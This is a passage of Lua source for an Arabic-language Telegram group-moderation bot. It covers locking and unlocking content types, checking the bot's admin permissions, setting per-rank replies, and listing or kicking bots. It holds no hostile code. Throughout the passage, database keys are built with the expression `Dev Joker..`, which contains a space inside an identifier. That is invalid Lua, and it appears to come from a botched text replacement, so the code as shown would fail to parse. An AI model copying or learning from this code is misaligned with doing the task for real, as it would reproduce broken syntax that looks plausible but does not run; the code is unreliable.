Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الصوت" then
if DevAbs:get(Dev Joker..'bot:voice:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الصوت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:voice:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الروابط" then
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الروابط بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:links:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "المواقع" then
if DevAbs:get(Dev Joker..'bot:location:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح المواقع بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:location:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "المعرف" then
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح المعرف بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'tags:lock'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المعرف بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الهاشتاك" then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الهاشتاك بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:abstag:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الجهات" then
if DevAbs:get(Dev Joker..'bot:contact:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الجهات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:contact:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الجهات بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الشبكات" then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الشبكات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:webpage:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "العربيه" then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح العربية بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:arabic:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العربية بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الانكليزيه" then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الانكليزيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:english:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الانكليزيه بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الاشعارات" then
if DevAbs:get(Dev Joker..'bot:tgservice:jk'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الاشعارات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:tgservice:jk'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الملصقات" then
if DevAbs:get(Dev Joker..'bot:sticker:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الملصقات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:sticker:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "التوجيه" then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التوجيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:forward:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
end
end
--     Source Joker     --
if text and text:match("^قفل التفليش$") then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط ', 1, 'md')
else
DevAbs:set(Dev Joker..'bot:links:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:forward:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:bots:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:bots:ban'..msg.chat_id_,true) DevAbs:set(Dev Joker..'anti-flood:'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:video:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:gifs:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'editmsg'..msg.chat_id_,true)
DevAbs:set(Dev Joker..'bot:sticker:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'farsi'..msg.chat_id_,true) DevAbs:del(Dev Joker.."fshar"..msg.chat_id_) DevAbs:del(Dev Joker.."taf"..msg.chat_id_) DevAbs:del(Dev Joker.."kaf"..msg.chat_id_) DevAbs:set(Dev Joker..'floodstatus'..msg.chat_id_,'Kicked') DevAbs:set('Dev Joker:id:photo'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:spam:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:webpage:mute'..msg.chat_id_,true)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التفليش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
if text and text:match("^فتح التفليش$") then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط ', 1, 'md')
else
DevAbs:del(Dev Joker..'bot:links:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:forward:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:bots:ban'..msg.chat_id_) DevAbs:del(Dev Joker..'anti-flood:'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:video:mute'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:gifs:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:sticker:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'farsi'..msg.chat_id_) DevAbs:set(Dev Joker..'fshar'..msg.chat_id_,true) DevAbs:set(Dev Joker..'taf'..msg.chat_id_,true) DevAbs:set(Dev Joker..'kaf'..msg.chat_id_,true)
DevAbs:del('Dev Joker:id:photo'..msg.chat_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التفليش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
--     Source Joker     --
if text and text:match("^قفل الكل$") then
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمشرفين فقط ', 1, 'md')
else
DevAbs:set(Dev Joker..'editmsg'..msg.chat_id_,true) DevAbs:set(Dev Joker..'farsi'..msg.chat_id_,true) DevAbs:del(Dev Joker..'fshar'..msg.chat_id_) DevAbs:del(Dev Joker..'taf'..msg.chat_id_) DevAbs:del(Dev Joker..'kaf'..msg.chat_id_) DevAbs:set(Dev Joker..'farsiban'..msg.chat_id_,true)
DevAbs:set(Dev Joker..'bot:bots:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:bots:ban'..msg.chat_id_,true) DevAbs:set(Dev Joker..'anti-flood:'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:text:mute'..msg.chat_id_,true) 
DevAbs:set(Dev Joker..'bot:inline:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:photo:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:spam:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:video:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:gifs:mute'..msg.chat_id_,true)
DevAbs:set(Dev Joker..'bot:music:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:voice:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:links:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:location:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'tags:lock'..msg.chat_id_,true)
DevAbs:set(Dev Joker..'bot:sticker:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'markdown:lock'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:forward:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'floodstatus'..msg.chat_id_,'Kicked')
DevAbs:set(Dev Joker..'bot:document:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:contact:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:abstag:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:webpage:mute'..msg.chat_id_,true) DevAbs:set(Dev Joker..'bot:tgservice:jk'..msg.chat_id_,true)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل جميع الاوامر \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
if text and text:match("^فتح الكل$") then
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمشرفين فقط ', 1, 'md')
else
DevAbs:del(Dev Joker..'editmsg'..msg.chat_id_) DevAbs:del(Dev Joker..'farsi'..msg.chat_id_) DevAbs:set(Dev Joker..'fshar'..msg.chat_id_,true) DevAbs:set(Dev Joker..'taf'..msg.chat_id_,true) DevAbs:set(Dev Joker..'kaf'..msg.chat_id_,true) DevAbs:del(Dev Joker..'farsiban'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:bots:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:bots:ban'..msg.chat_id_) DevAbs:del(Dev Joker..'keed_bots'..msg.chat_id_) DevAbs:del(Dev Joker..'anti-flood:'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:tgservice:jk'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:text:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:photo:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:spam:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:video:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:sticker:mute'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:document:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:inline:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'markdown:lock'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:gifs:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:music:mute'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:voice:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:links:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:location:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'tags:lock'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:forward:mute'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:abstag:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:contact:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:webpage:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:arabic:mute'..msg.chat_id_) DevAbs:del(Dev Joker..'bot:english:mute'..msg.chat_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح جميع الاوامر \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
--     Source Joker     --
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع عدد الاحرف (%d+)$") and ChCheck(msg) then
local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙اختر عدد اكبر من ( 40 ) حرف ', 1, 'md')
else
DevAbs:set(Dev Joker..'bot:sens:spam'..msg.chat_id_,sensspam[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد الاحرف : ( '..sensspam[2]..' )\n⌁︙اذا كانت الرسالة تحتوي على اكثر من ( '..sensspam[2]..' ) حرف سيتم حذفها تلقائيا بواسطة البوت ', 1, 'md')
end
end
end
--     Source Joker     --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text == "فحص" or text == "فحص البوت" then
local check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Dev Joker)
local GetInfo = JSON.decode(check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙صلاحيات البوت هي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙حذف الرسائل ↫ '..DEL..'\n⌁︙دعوة المستخدمين ↫ '..INV..'\n⌁︙حظر المستخدمين ↫ '..BAN..'\n⌁︙تثبيت الرسائل ↫ '..PIN..'\n⌁︙تغيير المعلومات ↫ '..EDT..'\n⌁︙اضافة مشرفين ↫ '..VIP..'\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
DevAbs:set(Dev Joker.."abs:SudoBot:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد المنشئ الاساسي (.*)$") 
DevAbs:set(Dev Joker.."abs:monsh:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevAbs:set(Dev Joker.."abs:monshid:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
DevAbs:set(Dev Joker.."abs:owners:Rd"..msg.chat_id_,Text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevAbs:set(Dev Joker.."abs:admins:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
DevAbs:set(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
DevAbs:set(Dev Joker.."abs:mem:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع ردود الرتب", 1, 'md')
DevAbs:del(Dev Joker.."abs:mem:Rd"..msg.chat_id_)
DevAbs:del(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_)
DevAbs:del(Dev Joker.."abs:admins:Rd"..msg.chat_id_)
DevAbs:del(Dev Joker.."abs:owners:Rd"..msg.chat_id_)
DevAbs:del(Dev Joker.."abs:monshid:Rd"..msg.chat_id_)
DevAbs:del(Dev Joker.."abs:monsh:Rd"..msg.chat_id_)
DevAbs:del(Dev Joker.."abs:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source Joker     --
if text == "كشف البوتات" and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
local function cb(extra,result,success)
local admins = result.members_  
text = '⌁︙*قائمة البوتات الحاليه* ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ❪✯❫'
end
text = text.."⌯ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتوجد بوتات هنا*\n ", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙*عدد البوتات هنا* ↫ ❪'..n..'❫ \n'
local f = '⌁︙*عدد البوتات المرفوعه* ↫ ❪'..t..'❫\n⌁︙*ملاحضه علامة ال ❪ ✯ ❫ تعني ان البوت ادمن في هذه المجموعه*'
Dev_Abs(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end
getChannelMembers(msg.chat_id_, 0, 'Bots', 200,cb)
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^حذف (.*)$") and ChCheck(msg) or text and text:match("^مسح (.*)$") and ChCheck(msg) or text and text:match("^طرد (.*)$") and ChCheck(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
local kicbot = {string.match(text, "^(طرد) (.*)$")}
if is_leader(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevAbs:del(Dev Joker..'abs:SudoBot:')
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المطورين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevAbs:del(Dev Joker..'abs:BanAll:')
DevAbs:del(Dev Joker..'abs:MuteAll:')
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قائمة العام \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
if txts[2] == 'البوتات' or txtss[2] == 'البوتات' or kicbot[2] == 'البوتات' then
local botslist = function(extra, result)
local list = result.members_
for i = 0, #list do
if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
end 
end
end
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف البوتات \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
end
if is_absmonsh(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المنشئين الاساسيين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'abs:monsh:'..msg.chat_id_)
end
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المنشئين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'abs:monshid:'..msg.chat_id_)
end end
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المدراء \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'abs:owners:'..msg.chat_id_)
end end
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف الادمنية \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'abs:admins:'..msg.chat_id_)
end
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المطاية \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف رابط المجموعة \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker.."bot:group:link"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المميزين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'abs:vipmem:'..msg.chat_id_)
end
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قائمة المنع \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:filters:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevAbs:del(Dev Joker..'abs:Muted:'..msg.chat_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المكتومين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
end
if is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^حذف (.*)$") and ChCheck(msg) or text and text:match("^مسح (.*)$") and ChCheck(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if txts[2] == 'قائمه المنع العام'or txtss[2] == 'قائمه المنع العام' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قائمة المنع العام \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:freewords:')
end
if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف الادمنية العامين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'abs:adminall:')
end
if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المميزين عام \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'abs:vipall:')
end
if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المدراء العامين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'abs:ownerall:')
end
end
end
--     Source Joker     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط ', 1, 'md')
else
DevAbs:del(Dev Joker..'abs:Ban:'..msg.chat_id_)
DevAbs:del(Dev Joker..'abs:admins:'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:donky:'..msg.chat_id_)
DevAbs:del(Dev Joker..'abs:vipmem:'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:filters:'..msg.chat_id_)
DevAbs:del(Dev Joker..'abs:Muted:'..msg.chat_id_)
